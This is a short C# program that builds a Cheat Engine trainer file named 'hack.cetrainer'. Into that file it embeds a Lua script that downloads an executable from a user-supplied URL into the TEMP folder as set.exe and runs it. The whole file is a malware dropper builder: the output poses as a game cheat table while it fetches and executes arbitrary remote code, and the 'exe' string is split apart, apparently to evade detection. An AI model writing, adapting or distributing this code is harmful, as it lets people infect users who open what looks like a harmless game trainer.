using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace Cetrainer_Build
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Write file url.");
            string url = Console.ReadLine();
            string code = "local url = '" + url + "'local a= getInternet()local test = a.getURL(url)local location = os.getenv('" + "TEMP" + "')local file = io.open(location..'\\\\" + "set" + "." + "exe" + "', 'wb')file:write(test)file:close()shellExecute(location..'\\\\" + "set" + "." + "exe" + "')";
            if (url.Contains("http"))
            {
                    string file = "hack.cetrainer";
                    File.WriteAllText(file, "<?xml version='1.0' encoding='utf-8'?>\n<CheatTable CheatEngineTableVersion='" + "3.1" + "'>\n  <CheatEntries/>\n  <UserdefinedSymbols/>\n  <LuaScript>\n" + code + "\n</LuaScript>\n</CheatTable>");
                MessageBox.Show("saved to hack.cetrainer");
                Environment.Exit(0);
            }
            else
            {
                MessageBox.Show("Please Provide a Link");
                Environment.Exit(0);
            }
        }
    }
}
